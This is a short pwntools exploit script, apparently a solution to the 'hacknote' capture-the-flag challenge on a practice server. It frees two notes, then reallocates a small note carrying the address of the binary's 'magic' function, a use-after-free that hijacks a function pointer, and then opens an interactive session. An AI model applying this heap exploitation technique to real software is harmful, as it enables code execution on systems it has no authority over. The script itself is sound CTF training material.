from pwn import *
#io = process("./hacknote")
io = remote("node3.buuoj.cn",29112)
elf=ELF('./hacknote')
magic_addr=elf.symbols['magic']
context(log_level='debug')
def add_note(size,payload):
	io.recvuntil("Your choice :")
	io.sendline("1")
	io.sendline(str(size))
	io.recvuntil("Content :")
	io.sendline(payload)
	io.recvuntil("Success !")
def print_note(index):
	io.recvuntil("Your choice :")
	io.sendline("3")
	io.recvuntil("Index :")
	io.sendline(str(index))
def delete_note(index):
	io.recvuntil("Your choice :")
	io.sendline("2")
	io.recvuntil("Index :")
	io.sendline(str(index))
add_note(0x20,"aaaa")
add_note(0x20,"bbbb")
delete_note(0)
delete_note(1)
add_note(8,p32(magic_addr))
print_note(0)
io.interactive()